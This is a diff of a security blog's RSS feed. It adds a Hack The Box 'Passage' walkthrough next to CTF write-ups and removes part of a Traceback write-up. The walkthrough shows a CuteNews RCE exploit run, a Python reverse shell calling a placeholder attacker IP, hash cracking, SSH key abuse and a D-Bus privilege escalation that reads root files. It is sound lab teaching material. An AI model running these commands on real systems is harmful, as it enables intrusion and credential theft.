@@ -1,4 +1,118 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Security, Development & Other Fun Stuff]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Thu, 04 Mar 2021 22:00:06 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC | Neuromancer]]></title><description><![CDATA[<p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">ØxOPOSɆC</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don't want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge consisted of <a href="https://neuromancer.herokuapp.com/">a Heroku app</a></p>]]></description><link>https://inesmartins.github.io//oposec-neuromancer/</link><guid isPermaLink="false">60285c828950580750b7d7d8</guid><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[neuromancer]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Feb 2021 20:14:29 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" alt="ØxOPOSɆC | Neuromancer"><p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">ØxOPOSɆC</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don't want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge consisted of <a href="https://neuromancer.herokuapp.com/">a Heroku app</a> with a very simple interface. If you took a closer look at the source code you'd see only an <code>&lt;img&gt;</code> sourced from Wikipedia (to prevent you from straying into steg territory) and an interesting comment:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-27.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>By googling the entire thing, you'd see that <a href="https://www.goodreads.com/quotes/14638-cyberspace-a-consensual-hallucination-experienced-daily-by-billions-of-legitimate">this is a quote from the book "Neuromancer"</a>, but with a slight difference:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/02/image-29.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>So, your first official hint was "how do you get in?", which should get you thinking about authentication and point you in the direction of <a href="https://neuromancer.herokuapp.com/login">the login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-30.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>If this page is under development, maybe the developers have already implemented the authentication mechanism ...</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-31.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Yup, now we're getting somewhere.</p><hr><h2 id="hint-2-how-much-do-you-know-about-neuromancer">Hint 2: How much do you know about Neuromancer?</h2><p>Just in case you thought this authentication feature had some interesting vulnerability, I released another hint to lure you in the right direction - <a href="https://en.wikipedia.org/wiki/Open-source_intelligence">OSINT</a>.</p><p>At this point, you could either solve this by brute-forcing or by googling.</p><h3 id="option-1-brute-force">Option 1 - Brute-force</h3><p>You could use a wordlist generator like <a href="https://tools.kali.org/password-attacks/cewl">cewl</a>, which (depending on the source you used) would most likely output the username and password on the top 50 words.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-32.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>If you then removed "common" words, this list would shrink down to 20, which means you could easily go through all of the possible combinations for both fields and solve the challenge:</p><h3 id="option-2-googling">Option 2 - Googling</h3><p>You could start by searching for the book's character list:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-33.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Neuromancer doesn't have a lot of characters in general, and the username - <code>case</code> - is the main character, so this was pretty straightforward. </p><p>Also, as soon as you tried <code>case</code> as the username, you'd see that the response was now different: </p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-34.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>From this point on, you could again brute-force for the password or you could google "Neuromancer password", which would take you to <a href="https://scifi.stackexchange.com/questions/6433/what-is-the-password-at-the-end-of-neuromancer">this</a> stackexchange question:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-35.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-36.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Although not the password in the book, <code>wintermute</code> was indeed the password for this challenge:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-37.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>That's it, hope you enjoyed it!</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks - Part III]]></title><description><![CDATA[<p>This level starts with the email message where the <a href="https://inesmartins.github.io/oposec-baby-challenge/">last level</a> ended:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-39.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-40.png" class="kg-image"></figure><p>When we go to <a href="https://sefod.eu/ctf/snippet.html">the link at the end of the message</a> we see a simple HTML page that contains a <code>&lt;meta&gt;</code> tag that uses <a href="https://www.w3schools.com/tags/att_meta_http_equiv.asp">the http-equiv attribute</a>:</p><pre><code>&lt;html&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Security, Development & Other Fun Stuff]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sun, 07 Mar 2021 12:41:31 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Passage]]></title><description><![CDATA[Write-up for Passage, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-passage/</link><guid isPermaLink="false">5f69aa685c95ba072b855f70</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Mar 2021 12:40:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/03/passage.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/275">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sV -sC passage.htb
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News</code></pre><img src="https://inesmartins.github.io//content/images/2021/03/passage.png" alt="HTB Write-up | Passage"><p>This one is pretty straightforward: </p><ul><li><code>SSH</code> on port 22;</li><li>an <code>Apache</code> web server on port 80.</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-18.png" class="kg-image" alt="HTB Write-up | Passage"></figure><p>The website was apparently developed using <a href="https://cutephp.com/">CuteNews</a>, a PHP-based news management system. All of the articles look like "Lorem Ipsum" except for <a href="http://passage.htb/index.php?id=11">the first one</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-20.png" class="kg-image" alt="HTB Write-up | Passage"></figure><p>In fact, all article IDs between 8 and 11 redirect to this article about the implementation of "Fail2Ban". </p><p>The article's author is called <code>admin</code>. Their profile link shows us an interesting email: <a href="https://inesmartins.github.io//p/3c0d4057-391e-4661-a683-f8761c1b8df1/nadav@passage.htb">nadav@passage.htb</a>.</p><p>Looking at the other articles we find the name of 3 other authors:</p><ul><li>Sid Meier</li><li>Kim Swift</li><li>James</li></ul><hr><h2 id="exploiting-cutenews-vulnerabilities">Exploiting CuteNews vulnerabilities</h2><p>After doing a quick search for vulnerabilities on version 2.1.2., I found <a href="https://www.cvedetails.com/cve/CVE-2019-11447/">CVE-2019-11447</a>:</p><blockquote>(...) An attacker can infiltrate the server through the avatar upload process in the profile area via the <code>avatar_file</code> field to <code>index.php?mod=main&amp;opt=personal</code>. <br>There is no effective control of <code>$imgsize</code> in <code>/core/modules/dashboard.php</code>. The header content of a file can be changed and the control can be bypassed for code execution. (An attacker can use the GIF header for this.) [<a href="https://www.cvedetails.com/cve/CVE-2019-11447/">Source</a>]</blockquote><p>I didn't event have to do any work for this one, since I found a <a href="https://www.exploit-db.com/exploits/48800">working exploit</a>.</p><pre><code>~ python3 cutenews.py
+
+Enter the URL&gt; http://passage.htb
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+================================================================
+
+=============================
+Registering a users
+=============================
+[+] Registration successful with username: ieQ5Hpbxxd and password: ieQ5Hpbxxd
+
+=======================================================
+Sending Payload
+=======================================================
+signature_key: 372b3c37331c51a3d8b0913162391f60-ieQ5Hpbxxd
+signature_dsi: 1b2359d409dd82293a1dcea4c28a824b
+logged in user: ieQ5Hpbxxd
+============================
+Dropping to a SHELL
+============================
+
+command &gt;</code></pre><p>Et voilà! We got a shell! Let's upgrade it.</p><!--kg-card-begin: markdown--><pre><code>/usr/bin/python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[ATTACKERS_IP]&quot;,[ATTACKERS_PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>It looks like we have 2 users on this machine: <code>nadav</code> and <code>paul</code>.</p><pre><code>ls -la /home/
+...
+drwxr-x--- 17 nadav nadav 4096 Sep 22 03:13 nadav
+drwxr-x--- 16 paul  paul  4096 Sep  2 07:18 paul</code></pre><p>Let's try to crack the hashes we collected on the previous step:</p><pre><code>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</code></pre><p>Using a SHA-256 "<a href="https://md5decrypt.net/en/Sha256/">online decrypter</a>" we immediately find a match for the 3rd one: <code>atlanta1</code>.  Let's see if I can use it with one of the known users:</p><pre><code>www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
+su - paul
+Password: atlanta1
+
+paul@passage:~$ cat user.txt
+03a499ddd51ad76b6e774d536068dcf3</code></pre><p>Second user was a flash. It seems like we can use a private key stored in <code>paul</code>'s <code>.ssh</code> directory to authenticate as <code>nadav</code>:</p><pre><code>paul@passage:~/.ssh$ ls -la
+total 24
+drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .
+drwxr-x--- 17 paul paul 4096 Nov  8 04:55 ..
+-rw-r--r--  1 paul paul  948 Nov  8 04:52 authorized_keys
+-rw-------  1 paul paul 1679 Jul 21 10:43 id_rsa
+-rw-r--r--  1 paul paul  395 Jul 21 10:43 id_rsa.pub
+-rw-r--r--  1 paul paul 1312 Jul 21 10:44 known_hosts
+
+paul@passage:~/.ssh$ ssh -i id_rsa nadav@passage.htb
+Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
+nadav@passage:~$</code></pre><p>Let's set up public key authentication on <code>nadav</code>'s account directly:</p><pre><code>nadav@passage:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/dTPIIPRFgRuu8I2qZ/1T6nvmR0T9Z0K627aKq9tWov1MntZGPes6gwzOtMwT2BhnBemGoSaTrquwgOMhALLdeGiFoJKG+kyazLn4NZSe6JNuhqP2E51f0vlBAqHxBMf651ddLs1tVHfhGJH95hw54DDyKXLQFjSQl3jc133HQnH9TIwm/v0xk/3aQUa5tvxfdKD4MpaoYKfV5gqA2yoOjqEImmvzsau0MpJn094eWHNJBU+w0sz8X2+b5tCwHCJajdL1GTcD5rOGke1e5lzUwklAH4m2HJkIw1MFhTuzY1LZbAsa5eSn41O9UeSct9RplocLo1DOHltoc/TReH2ODdb0b9oeEHIYRrMNY65OXAAz9gMA5dyUL2cEfo4O/oQVIJ7SLV2D8g3/FDgBaX1k2zp0ON7UyW3Oh9BBM2oKffiL7hN9X2ltjj3tcuzhh4qR2spOPIMwpUyS1aJnyh7+LNvaQ4QqSZR6TTzkBSS13nKRnEwPzbh6HFlfuaTSQJ0=' &gt;&gt; /.ssh/authorized_keys</code></pre><p>Now we can simply <code>SSH</code> as <code>nadav</code>:</p><pre><code>~ ssh -i id_rsa nadav@passage.htb
+Last login: Sun Nov  8 04:56:41 2020 from 127.0.0.1
+nadav@passage:~$</code></pre><hr><h2 id="getting-root">Getting root</h2><p>After not getting anything of relevance from the normal enumeration process, I turned to some local files to try and find some clues:</p><pre><code>nadav@passage:~$ cat .viminfo
+...
+
+# hlsearch on (H) or off (h):
+~h
+# Last Substitute Search Pattern:
+~MSle0~&amp;AdminIdentities=unix-group:root
+
+# Last Substitute String:
+$AdminIdentities=unix-group:sudo
+
+# Command Line History (newest to oldest):
+:wq
+:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
+
+# Search String History (newest to oldest):
+? AdminIdentities=unix-group:root
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Registers:
+
+# File marks:
+'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+# Jumplist (newest first):
+-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+# History of marks within files (newest to oldest):
+
+&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+	"	12	7
+
+&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+	"	2	0
+	.	2	0
+	+	2	0</code></pre><p>So it seems like <code>nadav</code> has replaced <code>AdminIdentities=unix-group:root</code> with <code>AdminIdentities=unix-group:sudo</code>, in a couple of files:</p><ul><li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li><li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li></ul><p>This is very interesting because <code>nadav</code> belongs to the <code>sudoer</code> group.</p><p>After looking around for some priv esc vulnerabilities related to <code>USBCreator</code> I stumbled upon <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">this</a> article:</p><blockquote>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. [<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">Source</a>]</blockquote><p>Following that article, I used <code>gdbus</code> to copy the flag from its original location to an accessible directory and then read the accessible file:</p><pre><code>~ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag.txt true
+()
+
+~ cat /tmp/flag.txt</code></pre><hr>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Neuromancer]]></title><description><![CDATA[<p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">ØxOPOSɆC</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don't want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge consisted of <a href="https://neuromancer.herokuapp.com/">a Heroku app</a></p>]]></description><link>https://inesmartins.github.io//oposec-neuromancer/</link><guid isPermaLink="false">60285c828950580750b7d7d8</guid><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[neuromancer]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Feb 2021 20:14:29 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" alt="ØxOPOSɆC | Neuromancer"><p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">ØxOPOSɆC</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don't want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge consisted of <a href="https://neuromancer.herokuapp.com/">a Heroku app</a> with a very simple interface. If you took a closer look at the source code you'd see only an <code>&lt;img&gt;</code> sourced from Wikipedia (to prevent you from straying into steg territory) and an interesting comment:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-27.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>By googling the entire thing, you'd see that <a href="https://www.goodreads.com/quotes/14638-cyberspace-a-consensual-hallucination-experienced-daily-by-billions-of-legitimate">this is a quote from the book "Neuromancer"</a>, but with a slight difference:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/02/image-29.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>So, your first official hint was "how do you get in?", which should get you thinking about authentication and point you in the direction of <a href="https://neuromancer.herokuapp.com/login">the login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-30.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>If this page is under development, maybe the developers have already implemented the authentication mechanism ...</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-31.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Yup, now we're getting somewhere.</p><hr><h2 id="hint-2-how-much-do-you-know-about-neuromancer">Hint 2: How much do you know about Neuromancer?</h2><p>Just in case you thought this authentication feature had some interesting vulnerability, I released another hint to lure you in the right direction - <a href="https://en.wikipedia.org/wiki/Open-source_intelligence">OSINT</a>.</p><p>At this point, you could either solve this by brute-forcing or by googling.</p><h3 id="option-1-brute-force">Option 1 - Brute-force</h3><p>You could use a wordlist generator like <a href="https://tools.kali.org/password-attacks/cewl">cewl</a>, which (depending on the source you used) would most likely output the username and password on the top 50 words.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-32.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>If you then removed "common" words, this list would shrink down to 20, which means you could easily go through all of the possible combinations for both fields and solve the challenge:</p><h3 id="option-2-googling">Option 2 - Googling</h3><p>You could start by searching for the book's character list:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-33.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Neuromancer doesn't have a lot of characters in general, and the username - <code>case</code> - is the main character, so this was pretty straightforward. </p><p>Also, as soon as you tried <code>case</code> as the username, you'd see that the response was now different: </p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-34.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>From this point on, you could again brute-force for the password or you could google "Neuromancer password", which would take you to <a href="https://scifi.stackexchange.com/questions/6433/what-is-the-password-at-the-end-of-neuromancer">this</a> stackexchange question:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-35.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-36.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>Although not the password in the book, <code>wintermute</code> was indeed the password for this challenge:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-37.png" class="kg-image" alt="ØxOPOSɆC | Neuromancer"></figure><p>That's it, hope you enjoyed it!</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks - Part III]]></title><description><![CDATA[<p>This level starts with the email message where the <a href="https://inesmartins.github.io/oposec-baby-challenge/">last level</a> ended:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-39.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-40.png" class="kg-image"></figure><p>When we go to <a href="https://sefod.eu/ctf/snippet.html">the link at the end of the message</a> we see a simple HTML page that contains a <code>&lt;meta&gt;</code> tag that uses <a href="https://www.w3schools.com/tags/att_meta_http_equiv.asp">the http-equiv attribute</a>:</p><pre><code>&lt;html&gt;
    &lt;body&gt;
       &lt;b&</code></pre>]]></description><link>https://inesmartins.github.io//opoleaks-underground-leaks-part-iii/</link><guid isPermaLink="false">5fd27a6e8950580750b7b566</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Jan 2021 17:27:10 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/01/image-22-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2021/01/image-22-1.png" alt="ØxOPOSɆC | Underground Leaks - Part III"><p>This level starts with the email message where the <a href="https://inesmartins.github.io/oposec-baby-challenge/">last level</a> ended:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-39.png" class="kg-image" alt="ØxOPOSɆC | Underground Leaks - Part III"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-40.png" class="kg-image" alt="ØxOPOSɆC | Underground Leaks - Part III"></figure><p>When we go to <a href="https://sefod.eu/ctf/snippet.html">the link at the end of the message</a> we see a simple HTML page that contains a <code>&lt;meta&gt;</code> tag that uses <a href="https://www.w3schools.com/tags/att_meta_http_equiv.asp">the http-equiv attribute</a>:</p><pre><code>&lt;html&gt;
    &lt;body&gt;
@@ -1286,86 +1400,4 @@ theseus@ubuntu:~$ touch /tmp/.abc/lshw
 theseus@ubuntu:~$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /tmp/.abc/lshw
 theseus@ubuntu:~$ chmod 777 /tmp/.abc/lshw
 </code></pre>
-<!--kg-card-end: markdown--><p>Now, we just need to run the <code>sysinfo</code> binary and in the output there's the root flag instead of the <code>lshw</code> output.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Traceback]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-traceback/</link><guid isPermaLink="false">5ee54aef3d00be7291b542b6</guid><category><![CDATA[htb]]></category><category><![CDATA[smevk]]></category><category><![CDATA[lua]]></category><category><![CDATA[cron]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 27 Aug 2020 12:14:04 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" alt="HTB Write-up | Traceback"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58 WEST
-Nmap scan report for 10.10.10.181
-Host is up (0.040s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
-|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
-|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Help us
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
-</code></pre>
-<!--kg-card-end: markdown--><p>The website is also very simple, there's only one page with the following text:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/trackeback_main.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at the source code we see some additional information: </p><!--kg-card-begin: markdown--><pre><code>&lt;h1&gt;This site has been owned&lt;/h1&gt;
-&lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt;
-&lt;h3&gt; - Xh4H - &lt;/h3&gt;
-&lt;!--Some of the best web shells that you might need ;)--&gt;
-</code></pre>
-<!--kg-card-end: markdown--><p>After some googling we see that the phrase "Some of the best web shells that you might need" is taken from the Github repo for the <a href="https://github.com/Xh4H/Web-Shells">Web-Shells project</a>. </p><p>This project contains multiple scripts and so I created a very simple Python script to test if any of these produced any result:</p><pre><code class="language-python">import os
-
-shells=["alfa3.php", "alfav3.0.1.php", "andela.php", "bloodsecv4.php", "by.php", "c99ud.php", "cmd.php", "configkillerionkros.php", "jspshell.jsp", "mini.php", "obfuscated-punknopass.php", "punk-nopass.p$
-for shell in shells:
-  print(shell)
-  res = os.system("curl http://traceback.htb:80/" + shell)
-  print(res)</code></pre><p>The only script that doesn't return 404 is <a href="https://inesmartins.github.io//p/791ca428-2df4-4f4f-8b65-7e7defda57e3/traceback.htb/smevk.php">smevk</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/smevk.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at <a href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php">the shell's source code on Github</a>, we see that the default credentials are <code>admin/admin</code>, and so we used them to authenticate.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/authed.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>smevk is basically a GUI that enables us to interact with the system as the user <code>webadmin</code>.</p><h2 id="practicing-our-lua">Practicing our LUA</h2><p>On the user's <code>home</code> directory we find a bunch of files in the <a href="http://www.lua.org/">Lua programming language</a> and a note:</p><!--kg-card-begin: markdown--><pre><code>- sysadmin -
